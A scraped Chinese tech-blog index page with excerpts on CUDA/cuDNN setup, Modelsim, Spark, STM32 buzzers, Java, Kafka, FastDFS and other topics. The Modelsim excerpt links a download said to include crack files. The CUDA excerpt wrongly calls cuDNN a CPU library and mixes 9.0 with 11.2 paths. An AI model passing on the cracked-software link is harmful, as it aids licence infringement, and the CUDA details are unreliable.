注意：默认安装路径是/usr/local/cuda-9.0，当然也可以自定义，安装到自己文件夹下面去，之后在.bashrc中配置好就行。
图片来自此博客
安装完以后CUDA-9.0文件夹下
三、安装CUDA9.0对应版本的cuDNN
cuDNN是一个对于深度神经网络的CPU计算库。
下载地址：cuDNN Archive | NVIDIA Developer
找到对应版本下载后是cudnn-9.0-linux-x64-v7.5.0.56.tgz
用命令tar zxvf xxxx.tgz解压，默认解压的文件夹名字叫cuda，里面内容有
下面就是将cuDNN里面的包拷贝到CUDA-9.0里面去
cp 复制的文件地址 复制到哪里去的地址
cp cuda/include/cudnn.h /usr/local/cuda-9.0/include
cp cuda/lib64/libcudnn* /usr/local/cuda-9.0/lib64
chmod a+r /usr/local/cuda-9.0/include/cudnn.h /usr/local/cuda-9.0/lib64/libcudnn*
其中/usr/local/要换成你的地址，我就是/home/xxx/CUDA-9.0。注意，~能表示/home/你的用户文件夹/ 地址。 要是有root权限那就cp命令前加上sudo，其他命令也类似。root权限需要管理员开。
四、配置.bashrc文件
vi ~/.bashrc
打开后按i(insert),在最下方输入代码
export CUDA_HOME="$HOME/cuda11.2" export PATH="$CUDA_HOME/bin:$PATH" export LD_LIBRARY_PATH="$CUDA_HOME/lib64:$LD_LIBRARY_PATH" export LD_LIBRARY_PATH="$CUDA_HOME/extras/CUPTI/lib64:$LD_LIBRARY_PATH" 最后一句是 tensorflow 要求的，它需要 cuda 的 CUPTI 库
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3dd1bc52ba337b42f5403db5496d1baa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4856ccf333bc9af1284a576487c7febd/" rel="bookmark">
			Modelsim下载安装【Verilog】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Modelsim下载安装【Verilog】 前言Modelsim下载安装一、下载二、安装三、使用四、测试四选一编写mux41编写mux41_tb运行仿真仿真结果结束仿真 五、打开已建立过的工程六、相关实验一、实验二选一编写代码仿真结果 二、实验四选一编写mux41编写mux41_tb运行仿真仿真结果结束仿真 三、实验D触发器编写代码开始仿真仿真结果 最后 前言 以下内容源自资源
仅供学习交流使用
请您阅读文章声明，默认同意该声明
Modelsim下载安装 一、下载 Modelsim SE-64 2020.4-windows（内含和谐文件）网盘分享：
链接：https://pan.baidu.com/s/1sJHqoj6VEwrmf6GBMLXshQ
提取码：161d
网盘下载速率提升
最新验证码：7678
二、安装 参考：Modelsim下载 安装 与 和谐教程
安装成功
三、使用 参考：ModelSim的使用详解
或老师演示视频
补充：
若出错
** Error (suppressible): (vsim-12110) All optimizations are disabled because the -novopt option is in effect. This will cause your simulation to run very slowly. If you are using this switch to preserve visibility for Debug or PLI features, please see the User’s Manual section on Preserving Object Visibility with vopt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4856ccf333bc9af1284a576487c7febd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd0f2ac5a361e86cfcc7c56f1734861b/" rel="bookmark">
			spark—三层架构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习目录 一、基本介绍二、举例说明1.写在一个scala文件中2.使用三层架构 一、基本介绍 基本概念：三层架构分为controller（控制层）、service（服务层）、dao（持久层），区分层次的目的即为了高内聚低耦合的思想。
controller：主要负责对数据的调度
service：主要负责对数据的操作和逻辑
dao：主要负责对数据的读取，跟文件、数据库等打交道
高内聚： 再来介绍高内聚，很多人对低耦合比较了解，但对高内聚却没有很多的了解，这是因为你再实现低耦合的过程中，其实无意中已经实现了高内聚，但我们还是要对其有了解，高内聚，故名思意，极高的内部聚合，这个内聚是针对于类的成员方法，模块间的耦合已经降低了，但对于模块内部呢？也就是一个一个的类中呢？我们应该尽可能的减少一个成员方法所能做的事情，尽可能使它只做一件事。这对我们寻找程序的问题和升级一个功能来说也是很有利的，我们不需要再去一个方法中的功能，而是直接添加或者修改一个方法，不需要去担心参数的问题。参考文章
低耦合： 我们先来说低耦合，因为这个比较广为人知，低耦合是针对于各个模块之间的，我们在实现一个项目时，会把各种功能分开实现，封装成为一个一个模块，从而降低他们之间的耦合性，耦合就是类似于齿轮，我们熟知，一个一个的齿轮协同工作，虽然看起来非常完美，但一旦其中一个出现问题，就需要停掉所有服务，重新修理，这对维护和升级来说都是非常痛苦的一件事。所以，我们倡导尽可能降低耦合，注意，耦合是不可能被完全消除的，只能尽可能减低，并且，降低模块间的依赖也有助于进行单元测试。参考文章
高内聚低耦合 简单来说就是一段代码完成一个小功能，各执其职，尽量不要一段代码写多个功能；如果每个代码块之间相互联系非常紧密，则耦合性就会很高，功能的独立性就越差！
优点：阅读性好，易扩展
其他模块
application（应用层）：所有的应用程序从application开始执行
common：存放通用的类和接口
util：存放工具类
bean：存放实体类
二、举例说明 案例：wordCount
1.写在一个scala文件中 package com.bigdata.SparkCore.wc import org.apache.spark.rdd.RDD import org.apache.spark.{SparkConf, SparkContext} /** * @author wangbo * @version 1.0 */ object wordcount3 { def main(args: Array[String]): Unit = { //Application //Spark框架 // TODO 建立和Spark框架的连接 //JDBC：Connection val sparkConf = new SparkConf().setMaster("local").setAppName("wordCount") val sc = new SparkContext(sparkConf) // TODO 执行业务操作 // 1.读取文件数据 val value: RDD[String] = sc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd0f2ac5a361e86cfcc7c56f1734861b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/883e297d344b388f02aacb0bee4d6f2e/" rel="bookmark">
			利用蜂鸣器播放音乐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们知道，蜂鸣器可分为有源蜂鸣器和无源蜂鸣器，有源蜂鸣器内置了频率发生电路，因此其通电就能够发出声音，但是其频率是固定的，而无源蜂鸣器内部没有频率发生电路，需要外界给予频率，因此适用于单片机控制使其发出不同的音调频率。在这一点有源蜂鸣器是做不到的。现在就利用无源蜂鸣器播放不同的音乐。
无源蜂鸣器的原理图：
蜂鸣器发声原理是电流通过电磁线圈，使电磁圈产生磁场来驱动振动膜发声的。因此需要一定的电流才能驱动它，而单片机I/O引脚输出的电压较小。单片机输出的TTL电平基本驱动不了蜂鸣器，因需要增加一个放大电路。这里用三极管作为放大电路。
由原理图分析知：通过控制晶体三极管的导通和截止就可以控制蜂鸣器的开关，因此通过控制GPIO_PB5引脚的高低电平的变化就可以控制三极管的导通截止。但是需要注意的是，在使用无源蜂鸣器时，单纯地给它高电平是不能使其导通的，这反而会时蜂鸣器中的项圈持续发热，长时间甚至可能损坏蜂鸣器，因此我们必须保证在空闲的状态下引脚的电平是高电平，使三极管截止。原理图中加入了上拉电阻正是防止在空闲状态下损坏蜂鸣器。
那么蜂鸣器能够发出不同的声音的原理是通过PWM波来驱动实现的，通过调节PWM波的频率就可以输出不同的声音。即引脚高低电平的变化，来产生频率一定的方波进而驱动蜂鸣器，而通过延时长度就可控制其节奏。假设要产生1kHz的频率，即每秒产生1000个振动周期，也就是一个频率周期就是1000us，所以通过控制方波高低电平的占空比就可以发出1kHz的音调频率。
软件实现：
基于STM32固件库函数控制蜂鸣器播放音乐
部分主要程序：
第一个枚举用于定义各个音阶对应的频率值，这样封装的目的是可以让简谱数组更易维护，接下来就是定义的简谱数组，只要按照简谱结构编写数组，就可以让单片机弹奏你的音乐。该数组有三部分组成，第一部分就是音调，第二部分就是数字表示的延时节奏，最后是两个 0，用于告诉单片机，此时演奏完毕，退出演奏循环。用两个 0 的目 的是，如果简谱是一个节奏对应一个延时的话，那么它是偶数个演奏单元，所以会用到最后 一个零，如果是奇数个演奏单元，就用到第一个 0 来标识结束。结束状态的控制也可以通过for循环控制。
通过下载调试最后能够达到很好的效果，如果想要达到更佳的效果可以通过调试延时长度达到自己想要的效果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/510496234b0ba6dacbf32efba97a4d7c/" rel="bookmark">
			微信小程序之短连接 分享转发 点击短连接就可以直接打开小程序某个页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微信小程序之短连接 分享转发 点击短连接就可以直接打开小程序某个页面 首先，小程序官网地址：https://developers.weixin.qq.com/miniprogram/dev/OpenApiDoc/qrcode-link/short-link/generateShortLink.html#%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F
官网有个错误：
我就随便试了试 pages前面不加 / 居然成功了！！！
这个官网示例竟然有/ 害我一上午！！！
话不多说，上代码：
实现效果图：需要分享的页面，复制链接功能
html:我这里是个弹层
&lt;view class="infoboxtan sharetanbox" wx:if="{{issharetan}}"&gt; &lt;view class="tanmain"&gt; &lt;view class="sharetopbox"&gt; &lt;view class="sharetxt"&gt;分享到&lt;/view&gt; &lt;view class="shareicobox"&gt; &lt;view class="wximgbox"&gt; &lt;image mode="aspectFill" src="http://www.meitang.cn/static/img/images/share_weixin.png" class="wximg" alt="" /&gt; &lt;view class="wximgtxt"&gt;微信好友&lt;/view&gt; &lt;button open-type="share" class="sharetap" /&gt; &lt;/view&gt; &lt;view class="wximgbox" bindtap="getaccess_token"&gt; &lt;image mode="aspectFill" src="http://www.meitang.cn/static/img/images/share_fuzhi.png" class="wximg" alt="" /&gt; &lt;view class="wximgtxt"&gt;复制链接&lt;/view&gt; &lt;!-- &lt;button open-type="share" class="sharetap" /&gt; --&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;view class="sharequxiao" bindtap="sharequxiaotap"&gt;取消&lt;/view&gt; &lt;/view&gt; &lt;/view&gt; css: less格式
.infoboxtan { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/510496234b0ba6dacbf32efba97a4d7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f730c9684f05a309fa6bb504f638cd7d/" rel="bookmark">
			Java基础加强
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.类加载器 1.1类加载器【理解】 作用
负责将.class文件（存储的物理文件）加载在到内存中
1.2类加载的过程【理解】 类加载时机
创建类的实例（对象）
调用类的类方法
访问类或者接口的类变量，或者为该类变量赋值
使用反射方式来强制创建某个类或接口对应的java.lang.Class对象
初始化某个类的子类
直接使用java.exe命令来运行某个主类
类加载过程
加载
通过包名 + 类名，获取这个类，准备用流进行传输
在这个类加载到内存中
加载完毕创建一个class对象
链接
验证
确保Class文件字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身安全
(文件中的信息是否符合虚拟机规范有没有安全隐患)
准备
负责为类的类变量（被static修饰的变量）分配内存，并设置默认初始化值
(初始化静态变量)
解析
将类的二进制数据流中的符号引用替换为直接引用
(本类中如果用到了其他类，此时就需要找到对应的类)
初始化
根据程序员通过程序制定的主观计划去初始化类变量和其他资源
(静态变量赋值以及初始化其他资源)
小结
当一个类被使用的时候，才会加载到内存
类加载的过程: 加载、验证、准备、解析、初始化
1.3类加载的分类【理解】 分类
Bootstrap class loader：虚拟机的内置类加载器，通常表示为null ，并且没有父null
Platform class loader：平台类加载器,负责加载JDK中一些特殊的模块
System class loader：系统类加载器,负责加载用户类路径上所指定的类库
类加载器的继承关系
System的父加载器为Platform
Platform的父加载器为Bootstrap
代码演示
public class ClassLoaderDemo1 { public static void main(String[] args) { //获取系统类加载器 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); ​ //获取系统类加载器的父加载器 --- 平台类加载器 ClassLoader classLoader1 = systemClassLoader.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f730c9684f05a309fa6bb504f638cd7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d46e9d8e6170110ee100403144df6318/" rel="bookmark">
			a&#43;&#43; 与 &#43;&#43;a 的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在自学C语言这一门技术，遇到a++、++a这一问题，很是迷，后来查资料，看别人解释，总结出自己的理解，喜欢的可以借鉴下。
a++ 与 ++a 都是要进行自增的，不过就是何时自增的顺序不同而已。
a++ —— 先取值后自增
如：a=10；
b=a++; 则 b =10；此时a= 11；（a++的值就是a，但计算完以后有副作用——加1，此时a=11。）
++a —— 先自增再取值
如：a=10；
b=++a；
则b=11,；此时a=11；（++a 就是a+1，然后再进行运算）
两者结合运算：
如：a=10；
（a++）+ （++a）
通俗点就是，a++先办事（运算）后给钱（+1）；++a先给钱（+1）后办事（运算）；
a-- 与 --a 同理一样的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43a2a8ab3f13f098107b4cbd69dd6744/" rel="bookmark">
			mysql replace into 异常1365 - Division by 0
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 修改mysql安装配置文件
vim /etc/my.cnf 添加一行配置 sql_mode="no_engine_substitution"
sql_mode="no_engine_substitution" 如下图 重启mysql服务
service mysqld restart 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/101b1a61f8c55da58825c637454a230a/" rel="bookmark">
			【Windows Server 2019】邮件服务器配置与管理——安装及配置Winmail服务器（上）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 7. 安装邮件服务器——Winmail8. 配置邮件服务器——Winmail8.1 运行服务器8.2 Winmail管理工具介绍8.3 域名配置 参考资料关联博文 7. 安装邮件服务器——Winmail （1）从官网下载好Winmail安装包后，双击打开，弹出安装提示框：【将在您的电脑上安装 Winmail Mail Server。【，点击【是】。
（2）选择安装时使用的语言，默认选择中文，点击【确定】。
（3）同意许可协议，点击【下一步】，进入【信息】界面，继续点击【下一步】。
（4）选择安装位置，根据实际情况选择即可，点击【下一步】。
（5）选择组件，默认选择，点击【下一步】。
（6）选择开始菜单文件夹，默认选择，点击【下一步】
（7）进入【选择附加任务】界面，勾选【注册为服务】，以及【保留原有数据】，点击【下一步】。
如果该服务器是全新的服务器，【清除原有数据】或者【保留原有数据】选择哪一个都可以，如果服务器之前安装过Winmail，建议选择【保留原有数据】，否则原有数据将被完全清除。
（8）设置登录管理工具时用的密码，点击【下一步】。
（9）最后进入【检查】界面，确认无误后，点击安装即可。如果有错误选项，返回上一步修改即可。
（10）安装完成后，勾选【现在运行】，然后点击【完成】。
8. 配置邮件服务器——Winmail 8.1 运行服务器 （1）先运行服务器。点击【开始】——&gt;【Winmail服务器程序】。
（2）关闭【快速设置导向】，将鼠标移到屏幕右下角的服务器图标，如果显示：Winmail Mail Server is running，则表明服务器已启动。如果没有服务器图标，尝试重复（1）。
8.2 Winmail管理工具介绍 （1）打开Winwail管理端
在桌面双击【Winmail管理端工具】，或右键点击屏幕右下角的邮件服务器小图标，选择【邮件系统管理】。
（2）选择连接服务器，勾选【本地主机】，用户名默认为admin，输入密码，点击【确定】。
（3）进入管理工具主页面，左侧菜单栏是各个功能菜单栏，主页内容为系统信息，包括产品名称，操作系统，内存，硬盘容量、使用期限等信息。
（4）打开左侧菜单栏的【系统设置】——&gt;【系统服务】。主页中会显示Winmail目前运行的服务，正常情况下所有的服务均处于开启状态，为绿色符号。如果有服务未启动，将鼠标点击未启动服务，在下方的按键中，手动将其开启。
各项具体功能详细请参阅安装包下载附录的《Winmail 6.6 简体中文帮助.pdf》。
8.3 域名配置 （1）展开左侧菜单的【域名设置】——&gt;【域名管理】——&gt;【新增】。
（2）在域名中输入：mail.fjnu.edu.cn，点击【确定】。
（3）返回【域名管理】界面，会显示刚创建的域名。
参考资料 Winmail 官网：Winmail 关联博文 关于 邮件服务器配置与管理 请查阅接下来的博文：
【Windows Server 2019】邮件服务器配置与管理——理论+实验拓扑说明
博文介绍了电子邮件的定义，工作原理（包括工作模式，SMPT协议，POP协议和工作原理拓扑图），电子邮箱的地址，常见邮件服务提供商及其域名，常见的电子邮件软件，以及本次实验得网络拓扑与说明及DNS设置。
【Windows Server 2019】邮件服务器配置与管理——安装及配置Winmail服务器（上）
博文介绍了如何安装邮件服务器 Winmail，如何配置Winmail，包括运行服务器，Winmail管理工具介绍和域名配置。
【Windows Server 2019】邮件服务器配置与管理——配置及验证Winmail服务器（下）
博文介绍了如何配置Winmail，包括创建账户，修改默认端口以及验证邮件服务器。同时介绍了使用邮件客户端Foxmail验证邮件服务器。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32f7aa9683251fccb87db8df540bfdab/" rel="bookmark">
			Windows常用快捷键
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 电脑键盘功能介绍键盘区域介绍电脑键盘功能介绍图解 Windows常用快捷键Windows快捷键Ctrl快捷键:Alt快捷键： 浏览器常用快捷键新建关闭选择地址栏--搜索栏 文档Word，表格Excel表格Excel--快捷键文档Word--快捷键(大全)常用快捷键1.用于设置--字符格式和段落格式的--快捷键2.用于--编辑和移动文字及图形--的快捷键　◆删除文字和图形◆插入特殊字符◆选定文字和图形◆选定表格中的文字和图形◆移动插入点◆在表格中移动◆在表格中插入段落和制表符 3.用于--处理文档的快捷键 --创建、查看和保存文档◆查找、替换和浏览文本◆撤消和恢复操作◆切换至其他视图◆用于审阅文档的快捷键 4.用于处理引用、脚注和尾注的快捷键5.用于处理域的快捷键 电脑键盘功能介绍 键盘区域介绍 电脑键盘功能介绍图解 Windows常用快捷键 Windows快捷键 Windows 显示或隐藏“开始”菜单
Windows +F1帮助
Windows +D显示桌面
Windows +R打开“运行”
Windows +E打开“我的电脑”
Windows +F搜索文件或文件夹
Windows +U打开“工具管理器”
Windows +Tab在打开的项目之间切换
Windows +BREAK显示“系统属性”
Ctrl+Alt+Delete 注销、锁定、任务管理器
Ctrl快捷键: Ctrl+S 保存
Ctrl+W 关闭程序
Ctrl+N 新建
Ctrl+O 打开
Ctrl+Z 撤销
Ctrl+F 查找
Ctrl+X 剪切
Ctrl+A 全选
Ctrl+C 复制
Ctrl+V 粘贴
Alt快捷键： Alt+F4 关闭当前程序–关机
浏览器常用快捷键 新建 打开新窗口 Ctrl + N
新建标签 Ctrl + T
关闭 关闭当前标签 Ctrl + W
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32f7aa9683251fccb87db8df540bfdab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a9d32d9c86ba94b8677264c9c0b7ee5/" rel="bookmark">
			Java 函数式编程合集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 很多编程语言可以把函数当作参数进行传递，例如js中事件触发后的函数调用、C语言中的函数指针，都可以完成函数的传递。但是在Java里一直没有一个传函数的标准，直到jdk8开始，有了函数传递的一套规范。
1. lambda表达式 1.1 支持版本 JDK8及以上
1.2 概念 也叫箭头函数，得益于javac的类型推断，编译器能够根据上下文信息推断出参数的类型。本质上是一个可传递的匿名函数，但是区别于匿名内部类，它不会编译出额外的类，例如 Main$1.class
1.3 基本语法 基本形式：parameter -&gt; expression 完整形式：(Type parameter1, Type parameter2) -&gt; { code block； return result; } 省略参数类型: (parameter1, parameter2) -&gt; { code block； return result; } 单参数省略参数括号：parameter -&gt; { code block； return result; } 只有一句表达式省略方法体括号：(Type parameter1, Type parameter2) -&gt; expression 1.4 省略关键 小括号内参数的类型可以省略
如果小括号内有且仅有一个参数，则小括号可以省略
如果方法体大括号内有且仅有一个语句，则无论是否有返回值，都可以省略大括号、return关键字及分号
1.5 注意事项 lambda表达式一般用作接口的实现上，用于简化代码。
new Thread(new Runnable() { @Override public void run() { } });//通过匿名内部类创建Runnable接口实现类作为Thread的参数 new Thread(() -&gt; { });//通过Labmda表达式创建Thread的参数 // Thread一定是只有一个抽象方法 lambda表达式往往是使用在方法内部的方法，因此lambda表达式里面声明的基本类型变量都会分配到栈上，每个都是线程安全的，因为栈上的变量不共享。如果lambda表达式方法内部需要修改外部变量的状态，这个变量要保证是在堆上分配，且要注意线程安全问题。 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a9d32d9c86ba94b8677264c9c0b7ee5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1225a521972a5def207e9b10ee4a351e/" rel="bookmark">
			【python简单介绍】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Python起源与定义
Python 是由荷兰人吉多·罗萨姆于 1989 年发布的。Python 的第一个公开发行版发行于 1991 年。Python 的官方定义：Python 是一种解释型的、面向对象的、带有动态语义的高级程序设计语言。通俗来讲，Python 是一种少有的、既简单又功能强大的编程语言，它注重的是如何解决问题而不是编程语言的语法和结构。
2.Python的应用范围
Python 在通用应用程序、自动化插件、网站、网络爬虫、数值分析、科学计算、云计算、大数据和网络编程等领域有着极为广泛的应用，像 OpenStack 这样的云平台就是由 Python 实现的，许多平台即服务（PaaS）产品都支持 Python 作为开发语言。近年来，随着 AlphaGo 几番战胜人类顶级棋手，深度学习为人工智能指明了方向。Python 语言简单针对深度学习的算法，以及独特的深度学习框架，将在人工智能领域编程语言中占重要地位。
3.Python的版本
Python前期主要有两大主要支流（2.x,3.x)。从 Python2 到 Python3 是一个大版本升级，有很多不向下兼容的差异，导致很多 Python2 的代码不能被 Python3 解释器运行，2020 年开始，Python 官方停止对 Python2 的维护，所有老代码都会超过保质期。所以，大概可能Python2.x凉凉了；Python3.x将成为Python学习的主流版本。
4.Python的优缺点
(1)优点
1.语言简洁
Python 是一种代表简单主义思想的语言。吉多·罗萨姆对 Python 的定位是“优雅，明确，简单”。Python 拒绝了“花俏”的语法，而选择明确的没有或者很少有歧义的语法，着重解决问题。
2.丰富的库（基础代码库）
Python 具有丰富和强大的库来被调用。用 Python开发，许多功能不必从零编写，直接使用现成的即可。Python 还有一个强大的后援—PyPI（https://pypi.python.org/pypi）。PyPI 是第三方 Python 模块集中存储库，可以把它当成大型的代码仓库。当你的需求的库在内置模块中找不到时，你可以很大概率能在PyPI上找到。全世界的 Python 用户都可以上传他们的模块以供分享，可以想象它的强大。当然身为未来大佬你也可以上传你的模块供全世界使用。
3.可扩展性强
这个特性经常为 Python 爱好者津津乐道，Python 经常用于将不同语言（尤其是 C/C++）编写的程序“粘”在一起，即 Python 的很多模块或者组件都是用其他语言写的，而 Python 的一个功能就是把这些模块很轻松地联结在一起。所以，人们也常常称 Python 为“胶水语言”，“万能语言”。
4.开源
Python 是自由/开源软件，使用者可以自由地发布这个软件的副本，阅读它的源代码，对它做改动，把它的一部分用于新的自由软件中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1225a521972a5def207e9b10ee4a351e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed6ac5efaaabd770d30211eaaca312ed/" rel="bookmark">
			创建工程文件中的.yml文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先new里面打开settings
然后打开File and Code Templates，点击加号。
然后会出现如下所示的界面：
然后在对应地方写上文件名和扩展名。
之后就能看见自己创建的YML file文件了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6b900a0f44e44fd754d0b192be5ccad/" rel="bookmark">
			kafka_2.13-3.3.1在CentOS7中单机部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载好后安装： tar -zxf kafka_2.13-3.3.1.tgz 然后进入解压后的目录，创建logs文件夹： cd kafka_2.13-3.3.1/ mkdir logs 之后进入config目录，修改 server.properties 的如下内容： #配置需要监听的URI listeners = INSIDE://0.0.0.0:9091,OUTSIDE://0.0.0.0:9092 #内网IP和外网IP 该参数是将listener发布到Zk中，供client使用 advertised.listeners=INSIDE://172.17.0.15:9091,OUTSIDE://x.x.x.x:9092 #把OUTSIDE 的安全协议映射成PLAINTEXT INSIDE也映射成PLAINTEXT listener.security.protocol.map=INSIDE:PLAINTEXT,OUTSIDE:PLAINTEXT # Broker之间的连接用 INSIDE 监听器 inter.broker.listener.name=INSIDE log.dirs=/opt/kafka_2.13-3.3.1/logs 命令行启动：
#以守护进程启动zookeeper： bin/zookeeper-server-start.sh -daemon config/zookeeper.properties #接着启动kafka： bin/kafka-server-start.sh -daemon config/server.properties 简单测试：
# 创建topic bin/kafka-topics.sh --create --topic test1 --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1 # 查看topic bin/kafka-topics.sh --list --bootstrap-server localhost:9092 # 删除topic bin/kafka-topics.sh --delete --bootstrap-server localhost:9092 --topic test1 # 生产消息 bin/kafka-console-producer.sh --topic test1 --bootstrap-server localhost:9092 为Zookeeper创建服务，编辑/usr/lib/systemd/system/zookeeper.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6b900a0f44e44fd754d0b192be5ccad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58a75498ebc277001d96c5575fe92dd1/" rel="bookmark">
			什么是fastdfs、fastdfs简单介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 环境：Centos7.9
什么是FastDFS FastDFS 是一个开源的轻量级分布式文件系统，它对文件进行管理，功能包括：文件存储、文件同步、文件访问（文件上传、文件下载）等，解决了大容量存储和提交均衡的问题。特别适合以文件为载体的在线服务，如相册网站、视频网站等 。FastDFS 为互联网专业定制，充分考虑了统计数据、负载均衡、扩大容容等，指标并适当高准、合适等。使用FastDFS很容易建立起自己的文件服务器，提供文件、下载等服务。
FastDFS的3个角色 1 ）客户端
2 ） tracker追踪服务器
3 ）存储存储服务器
原理步骤：客户端请求----追踪服务器----给客户端分配一个组----最终客户端将数据写入组中。
客户端：Client，客户端，主要是上传下载文件数据，包括我们部署的应用服务器或浏览器等。
跟踪服务器：tracker server，跟踪服务器主要负责调度工作，起到了负载均衡的效果，负责管理所有的storage server 和group，每个storage在启动后都会链接Tracker，storage server会定期的向tracker server发送自己的状态信息，如告知自己所属的group等信息，并保持周期性心跳，Tracker是连接客户端与组和存储枢纽，Tracker server也可以时多台的、集群的。
存储服务器：storage server，存储服务器负责存储数据和备份，存储服务器以group为单位，每个组又可以又多个storage server，组内的storage server数据互为备份。
以上，tracker server就起到了负载均衡的作用，storage server由于同一个组内的server互为备份，所以storage server就起到了数据冗余备份的作用。
FastDFS上传机制 如上图，当tracker收到客户端的上传文件的请求时，tracker会去storage查询可用的group，并返回给客户端storage的IP和端口，即group等信息，客户端向storage发送写文件请求，storage将会分配一个数据目录，然后为文件生成一个file_id，存储路径，文件名并存储文件，storage返回file_id、路径和文件给客户端。
FastDFS下载机制 FastDFS文件同步机制 写文件时，客户端将文件写至group内的一个storage server即认为写入成功，storage server写完后将由后台线程将文件同步到group内的其他storage server，实现原理是：每个storage 写文件后会同时写一份binlog，binlog不包含数据，只包含文件名等元数据，这份binlog用于后台同步，storage 会记录group内其他的storage 同步进度，一遍重启后能衔接上次的同步进度继续同步，进度以时间戳的方式记录，所以最好保证集群内的server时间一致。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bed5181a8efbf51fefccc219babf6e65/" rel="bookmark">
			经典网络架构训练图像分类模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用经典网络完成花朵的102分类 数据预处理数据读取数据增强 迁移学习重定义全连接层执行函数，调整网络可更新参数 设置优化器训练模块第一轮训练加训测试数据预处理展示预测结果 数据预处理 今天我们使用的数据集和以前几次有所不同，我们的训练集和测试集都是由文件夹组成的，文件夹的名字是花朵的分类，文件夹存储了该种类花朵的几张图片。
每个编号对应的花朵名称储存在另一个地方，由于每种花朵的图片数量都比较少，所以我们需要做一下数据增强。
数据读取 在开始写代码之前，先做好模块引用：
import os import matplotlib.pyplot as plt import numpy as np import torch from torch import nn import torch.optim as optim import torchvision from torchvision import transforms, models, datasets # https://pytorch.org/docs/stable/torchvision/index.html import imageio import time import warnings warnings.filterwarnings("ignore") import random import sys import copy import json from PIL import Image 引用号模块之后，我们把文件的路径读取到位：
data_dir = './flower_data/' train_dir = data_dir + '/train' valid_dir = data_dir + '/valid' 因为我是把py文件和数据文件放在了同一路径下，所以引用起来也比较简单。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bed5181a8efbf51fefccc219babf6e65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0dc661e6678a0bc321bd7ad840c0707b/" rel="bookmark">
			【Windows Server 2019】活动目录 (Active Directory) ——子域的安装和验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
